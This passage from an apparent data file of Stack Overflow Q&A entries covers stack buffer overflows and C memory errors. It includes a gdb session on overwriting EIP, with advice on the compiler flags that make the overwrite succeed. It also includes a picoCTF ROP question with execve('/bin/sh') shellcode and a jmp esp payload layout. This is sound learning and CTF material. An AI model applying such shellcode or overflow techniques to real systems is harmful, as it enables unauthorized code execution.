        "Question": "I was watching this video on youtube: https://www.youtube.com/watch?v=1S0aBV-Waeo and i was trying to do the same steps shown in the video, but i can't seem to overwrite the EIP. I don't know if it's because the gdb may have changed during the years, or if anything else has. What i get when i try to overflow is the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x080491ac in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n\nI can't seem to overwrite the eip, no matter how large my input is. The code is the same as shown in the video with a smaller buffer size.\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[10];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\nI also get asked the following when running my program in gdb for the first time\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \n\nThis is the register info in gdb\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b2          -10574\nedx            0xffffd396          -11370\nebx            0x804bff4           134529012\nesp            0xffffd390          0xffffd390\nebp            0xffffd3a8          0xffffd3a8\nesi            0xffffd480          -11136\nedi            0xf7ffcb60          -134231200\neip            0x80491a3           0x80491a3 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n\n(gdb) x/20x $esp\n0xffffd390: 0xffffffff  0x4141d3d4  0x41414141  0x41414141\n0xffffd3a0: 0xffff0041  0xf7e1fe2c  0x00000000  0xf7c20af9\n0xffffd3b0: 0x00000000  0x00000000  0x080482e7  0xf7c20af9\n0xffffd3c0: 0x00000002  0xffffd474  0xffffd480  0xffffd3e0\n0xffffd3d0: 0xf7e1fe2c  0x0804907d  0x00000002  0xffffd474\n\nI'm compiling with the following flags\ngcc -o example2 -fno-stack-protector -no-pie -m32 -g -z execstack example2.c -w\n\nThe whole interaction on gdb\n(gdb) disassemble main\nDump of assembler code for function main:\n   0x080497d5 <+0>: lea    0x4(%esp),%ecx\n   0x080497d9 <+4>: and    $0xfffffff0,%esp\n   0x080497dc <+7>: push   -0x4(%ecx)\n   0x080497df <+10>:    push   %ebp\n   0x080497e0 <+11>:    mov    %esp,%ebp\n   0x080497e2 <+13>:    push   %ebx\n   0x080497e3 <+14>:    push   %ecx\n   0x080497e4 <+15>:    sub    $0x10,%esp\n   0x080497e7 <+18>:    call   0x804981c <__x86.get_pc_thunk.ax>\n   0x080497ec <+23>:    add    $0x9a808,%eax\n   0x080497f1 <+28>:    mov    %ecx,%edx\n   0x080497f3 <+30>:    mov    0x4(%edx),%edx\n   0x080497f6 <+33>:    add    $0x4,%edx\n   0x080497f9 <+36>:    mov    (%edx),%edx\n   0x080497fb <+38>:    sub    $0x8,%esp\n   0x080497fe <+41>:    push   %edx\n   0x080497ff <+42>:    lea    -0x12(%ebp),%edx\n   0x08049802 <+45>:    push   %edx\n   0x08049803 <+46>:    mov    %eax,%ebx\n   0x08049805 <+48>:    call   0x8049020\n   0x0804980a <+53>:    add    $0x10,%esp\n   0x0804980d <+56>:    mov    $0x0,%eax\n--Type <RET> for more, q to quit, c to continue without paging--\n   0x08049812 <+61>:    lea    -0x8(%ebp),%esp\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\nEnd of assembler dump.\n(gdb) break *0x08049805\nBreakpoint 1 at 0x8049805: file example.c, line 6.\n(gdb) break *0x08049812\nBreakpoint 2 at 0x8049812: file example.c, line 9.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/r3/buffer-overflows/bo in memory example/example AAAAAAAAAAAAAAAAAAAAAAAAA\n\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \nDebuginfod has been disabled.\nTo make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.\n\nBreakpoint 1, 0x08049805 in main (argc=2, argv=0xffffd464) at example.c:6\n6       strcpy(buffer, argv[1]);\n(gdb) info reg\neax            0x80e3ff4           135151604\necx            0xffffd330          -11472\nedx            0xffffd306          -11514\nebx            0x80e3ff4           135151604\nesp            0xffffd2f0          0xffffd2f0\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049805           0x8049805 <main+48>\neflags         0x292               [ AF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd2f0: 0xffffd306  0xffffd6a4  0x00000000  0x080497ec\n0xffffd300: 0x080ade17  0x080e7c04  0x08049030  0x080ae037\n0xffffd310: 0xffffd330  0x080e3ff4  0xffffd428  0x08049ceb\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n(gdb) c\nContinuing.\n\nBreakpoint 2, main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b0          -10576\nedx            0xffffd312          -11502\nebx            0x80e3ff4           135151604\nesp            0xffffd300          0xffffd300\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049812           0x8049812 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd300: 0x080ade17  0x41417c04  0x41414141  0x41414141\n0xffffd310: 0x41414141  0x41414141  0x41414141  0x00414141\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n0xffffd340: 0x080e3ff4  0x0804968d  0x00000002  0xffffd464\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804981b in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0x41414141          1094795585\nedx            0xffffd312          -11502\nebx            0x41414141          1094795585\nesp            0x4141413d          0x4141413d\nebp            0x41414141          0x41414141\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x804981b           0x804981b <main+70>\neflags         0x10286             [ PF SF IF RF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0x4141413d: Cannot access memory at address 0x4141413d\n(gdb) c\nContinuing.\n\nProgram terminated with signal SIGSEGV, Segmentation fault.\nThe program no longer exists.\n\n",
        "Answer": "This code\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\n\nrestores registers from their saved location on stack. However, you've overwritten the stack contents, so all the registers are now set to 0x4141... values. And that causes the lea    -0x4(%ecx),%esp instruction to SIGSEGV, since ECX points to inaccessible memory.\nAs ssbssa commented, this is happening due to stack realignment (which itself is needed to deal with 64-bit aligned (newer) AVX etc.).\nIf I turn stack realignment off with -mpreferred-stack-boundary=2, the code becomes:\n   0x08049176 <+0>:     push   %ebp\n   0x08049177 <+1>:     mov    %esp,%ebp\n   0x08049179 <+3>:     sub    $0xc,%esp\n   0x0804917c <+6>:     mov    0xc(%ebp),%eax\n   0x0804917f <+9>:     add    $0x4,%eax\n   0x08049182 <+12>:    mov    (%eax),%eax\n   0x08049184 <+14>:    push   %eax\n   0x08049185 <+15>:    lea    -0xa(%ebp),%eax\n   0x08049188 <+18>:    push   %eax\n   0x08049189 <+19>:    call   0x8049050 <strcpy@plt>\n   0x0804918e <+24>:    add    $0x8,%esp\n   0x08049191 <+27>:    mov    $0x0,%eax\n   0x08049196 <+32>:    leave\n   0x08049197 <+33>:    ret\n\nand the RIP overwrite works:\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) x/i $pc\n=> 0x41414141:  Cannot access memory at address 0x41414141\n\n",
        "Source": "https://stackoverflow.com/questions/78053915/eip-doesnt-get-overwritten-when-perfoming-a-buffer-overflow-attack"
    },
    {
        "Title": "Buffer Overflow: Why does buffer assignment impact other variables?",
        "Question": "\nvoid foo() {\n    int value = 0;\n    char buf[4];\n    buf[4] = 1;\n\n\n    printf(\"value: %d\\n\", value);\n}\n\nint main() {\n    foo();\n    return 0;\n}\n\n\n\nWhy does 'value' print 1?\nI believe this has to do with buffer overflow and little endian but I am finding it hard to grasp.\n",
        "Answer": "Because it is Undefined Behaviour.\nIt is enough to change the optimization options and you will get different results.\nGodbolt for example:\n\nWith -O0 : 1\nWith -Os : 0\n\nBut it does not have to be like this. It can end up in the segfault or something else may happen.\nhttps://godbolt.org/z/TEbWbMvsa\n\nI understand it's undefined behavior. I was just wondering how this is\nrelated to little endian. When I went past buf[3] into buf[4], it\nstarted changing the next byte in memory. How do I know the next byte\nin memory is 'value'?\n\nYou cant know it. Order is not specified. value can be optimized out and not stored on the stack at all. You need to know your ABI and compiler very well to predict it.\nIn your case:\n+ 0x07: value byte 4  MSB\n+ 0x06: value byte 3\n+ 0x05: value byte 2\n+ 0x04: value byte 1  LSB\n+ 0x03: buf[3]\n+ 0x02: buf[2]\n+ 0x01: buf[1]\n+ 0x00: buf[0]\n\n",
        "Source": "https://stackoverflow.com/questions/77937810/buffer-overflow-why-does-buffer-assignment-impact-other-variables"
    },
    {
        "Title": "ROP - The use of the jmp esp",
        "Question": "I was playing some picoCTF challenges today and I found myself stuck in a challenge.\nDigging around the internet, I found a solution online which I cannot fully grasp.\nThe challenge (whose name I won't spoil for those who are playing picoCTF) revolves around a vulnerable x86 ELF, and it involves using ROP gadgets to gain a shell, however the checksec reveals that the binary is not PIE, and there is no NX enabled.\nBy breaking at ret of the vulnerable function, I noticed that the EAX register contains the start address of the buffer on the stack. Moreover, I found out that the offset between the start of the buffer and the saved EIP is 28 bytes.\nSo my first guess was to craft a sufficiently short shellcode, place it inside the buffer preceeded by a NOP sled, and overwrite the saved EIP with a gadget jumping to the content of the EAX register, aka the start of my buffer.\nHowever, I found out that this approach is not working.\nThe shellcode I crafted is:\nint 0x3   ; used for debugging purposes\nxor eax, eax\npush eax\npush 0x0068732f\npush 0x6e69622f\nxor ebx, ebx\npush eax\npush ebx\nmov ecx, esp\nmov al, 0xb\nint 0x80\n\nI assembled it using pwntool's asm library, setting the architecture to i386.\nThe debugger reveals the following after few steps in:\npwndbg> \n\nProgram received signal SIGSEGV, Segmentation fault.\n0xff854a01 in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x0\n EBX  0x0\n ECX  0x80e5300 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2088\n EDX  0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EDI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n ESI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EBP  0x90909090\n ESP  0xff854a00 \u25c2\u2014 0x0\n EIP  0xff854a01 \u25c2\u2014 0x2f000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / i386 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   0xff8549f3    push   eax\n   0xff8549f4    push   0x68732f\n   0xff8549f9    push   0x6e69622f\n   0xff8549fe    xor    ebx, ebx\n   0xff854a00    add    byte ptr [eax], al\n    \u2193\n \u25ba 0xff854a01    add    byte ptr [eax], al\n   0xff854a03    add    byte ptr [edi], ch\n   0xff854a05    bound  ebp, qword ptr [ecx + 0x6e]\n   0xff854a08    das    \n   0xff854a09    jae    0xff854a73                    <0xff854a73>\n    \u2193\n   0xff854a73    add    byte ptr [eax], al\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n00:0000\u2502 esp eip-1 0xff854a00 \u25c2\u2014 0x0\n01:0004\u2502           0xff854a04 \u25c2\u2014 '/bin/sh'\n02:0008\u2502           0xff854a08 \u25c2\u2014 0x68732f /* '/sh' */\n03:000c\u2502           0xff854a0c \u25c2\u2014 0x0\n04:0010\u2502 edx       0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n... \u2193              2 skipped\n07:001c\u2502           0xff854a1c \u25c2\u2014 0x3e8\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ BACKTRACE ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba f 0 0xff854a01\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\npwndbg> \n\nMeaning that the execution is breaking at 0xff854a00.\nNow the solution I found online involved crafting the overflow string in the following way:\n\nWrite 6 NOPs.\nPlace the assembled instruction for jmp esp\nWrite 20 more NOPs.\nPlace the jmp eax gadget to jump to the start of the buffer, overwriting the saved EIP.\nAppend the shellcode.\n\nFrom what I've understood, the jmp ESP instruction allows to direct the execution right after the ret instruction, thus jumping inside the shellcode, but I would like to know more about this.\nI even tried recalling the x86 Call/Return Protocol, but it seems that I cannot fully grasp how jumping to the stack would actually resolve the challenge.\nI seek your help.\nThanks!\n",
        "Answer": "Your code is on the stack under the stack pointer. Part of it is overwritten by your own push instructions. Notice that bound ebp, qword ptr [ecx + 0x6e] has machine code 62 69 6E which corresponds to push 0x6e69622f. Adjusting esp downwards by a suitable amount should fix the problem, e.g. sub esp, 32\nThe other solution works around the problem by putting most of the shellcode above the stack pointer and only using a single jmp esp to transfer control. Here is an illustration of the memory layout:\n|    ...      |           |     ^       |\n|    ...      |           |     |       |\n|    ...      |           |     |       |\n|    ...      | <= ESP => |  shellcode  |\n+-------------+           +-------------+\n|  ret addr   |  jmp eax  |  ret addr   |\n+-------------+           +-------------+\n| pushed data |           | pushed data |\n|     |       |           |     |       |\n|     |       |           |     |       |\n|     v       |           |     v       |\n|  !overlap!  |           |    ...      |\n|     ^       |           |   jmp esp   |\n|     |       |           |    nop      |\n|     |       |           |    nop      |\n|  shellcode  | <= EAX => |    nop      |\n+-------------+           +-------------+\n\nThe initial nops are probably not needed, it should work fine with the jmp esp followed by 26 nops (or whatever padding since it's not going to be executed) instead.\n",
        "Source": "https://stackoverflow.com/questions/77832621/rop-the-use-of-the-jmp-esp"
    },
    {
        "Title": "why is my malloc(1) segfaulting my program?",
        "Question": "I have a problem in my C program that makes it so that it segfaults on malloc(1). I've spent many hours trying to find out why it segfaults but\nI just can't figure it out. This portion of my program separates strings using identifiers. Example, string=\"12wo4ne53wone86wo99w5ne\"; identifiers, start=\"wo\", end=\"ne\"; would return {\"wo4ne\", \"wone\", \"wo99w5ne\"}.\nMy code is as follows.\n// basically like substring() in java\nchar* stringAt(char* str, int start, int end) {\n    int length = end - start + 1;\n    int temp = start;\n    char* savedChar = NULL;\n    savedChar = malloc(length + 1);\n    for(int x = 0; x < length; x++) {\n        savedChar[x] = str[temp];\n        temp++;\n    }\n    savedChar[length] = '\\0';\n    return savedChar;\n}\n\n// finds \"identifier\" in string after certain position in that string\nint findIdentifier(char* str, char* identifier, int pos, int isEnd) {\n\n    // checks first character with first character in \"identifier\"\n    for(int x = pos; x < strlen(str) - 1; x++) {\n        if(str[x] == identifier[0]) {\n\n            // if first characters match then check rest\n            for(int i = 0; i < strlen(identifier); i++) {\n                if(str[x + i] != identifier[i]) {\n                    i = strlen(identifier);\n                }\n                if(i == strlen(identifier) - 1) {\n\n                    // isEnd checks if you should count the last position of the identifier...\n                    // -like ident=\"1234\" then \"end\" is the position of \"4\".\n                    // -not end be the position of \"1\"\n                    if(isEnd == 1) {\n                        return x + strlen(identifier) - 1;\n                    }\n                    return x;\n                }\n            }\n        }\n    }\n    return -1;\n}\n\nchar** separateStrings(char* str, char* identifier, char* lastIdentifier) {\n    char** savedStr = NULL;\n\n    // segfault here!\n    savedStr = malloc(1);\n    // segfualt here!\n\n    int start = -2;\n    int end = 0;\n    int x = 0;\n    do {\n\n    // first run check/gets first and last positions of the identifier in the string\n    if(start == -2) {\n        start = findIdentifier(str, identifier, 0, 0);\n    } else {\n    start = findIdentifier(str, identifier, end + 1, 0);\n    }\n    end = findIdentifier(str, lastIdentifier, start + 1, 1);\n    \n    if(start != -1) {\n        if(end == -1) {\n            end = strlen(str);\n        }\n        char* newStr = stringAt(str, start, end);\n\n        // dynamically increase the size of savedStr (x is iterated every run through here)\n        realloc(savedStr, x + 1);\n        savedStr[x] = malloc(strlen(newStr) + 1);\n        strcpy(savedStr[x], newStr);\n        x++;\n    }\n\n    } while(start != -1 && end != -1);\n    return savedStr;\n}\n\nI have tried looking up why this could not be working and the only thing I can think of is a Buffer Overflow. So I then tried to run findIdentifier() many times but that works fine.\nThe program is also inconsistent and sometimes runs farther into the code than others but is accurate with its outcomes.\n",
        "Answer": "If savedStr is supposed to be a dynamically allocated array of strings, then allocating 1 byte of memory is not sufficient to store a pointer to a char (depending on your platform, this requires either 4 or 8 bytes).\nEven when you realloc it to be larger, you're only adding 1 byte at a time. This when you reference and assign with savedStr[x] = malloc(strlen(newStr) + 1); you're invoking undefined behavior, which in this case it would seem has manifested as a segmentation fault.\nYou almost certainly want to allocate:\nsavedStr = malloc(sizeof(char *));\n\nAnd then when you re-allocate:\nrealloc(savedStr, (x + 1) * sizeof(char *));\n\nBut you also want to capture the pointer realloc returns. If you're not too worried about allocation error checking:\nsavedStr = realloc(savedStr, (x + 1) * sizeof(char *));\n\nBreaking out the dynamically resized string vector problem\nOne of the core problems your code solves is having an array that grows dynamically. If you break this bit of code out, then you can approach the remainder of your program without worrying about the memory management.\nThe size of the array doubles when needed rather than growing by a single entry to minimize allocations. There may be more ideal growth factors for efficiency.\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n\nstruct string_vec {\n    char **data;\n    size_t cap;\n    size_t sz;\n};\n\nstruct string_vec *string_vec_new(size_t cap) {\n    struct string_vec *vec = malloc(sizeof(struct string_vec));\n    if (!vec) return NULL;\n\n    *vec = (struct string_vec){\n        .data = malloc(sizeof(char *) * cap),\n        .cap = cap,\n        .sz = 0\n    };\n\n    return vec;\n}\n\nstruct string_vec *string_vec_add(\n    struct string_vec *vec,\n    const char *str\n) {\n    if (vec->sz < vec->cap) {\n        vec->data[vec->sz++] = strdup(str);\n        return vec;\n    }\n\n    char **new_data = realloc(vec->data, sizeof(char *) * vec->cap * 2);\n    if (!new_data) return NULL;\n\n    vec->data = new_data;\n    vec->cap *= 2;\n    vec->data[vec->sz++] = strdup(str);\n\n    return vec;\n}\n\nvoid string_vec_del(struct string_vec *vec) {\n    for (size_t i = 0; i < vec->sz; i++) {\n        free(vec->data[i]);\n    }\n\n    free(vec->data);\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77724594/why-is-my-malloc1-segfaulting-my-program"
    }
]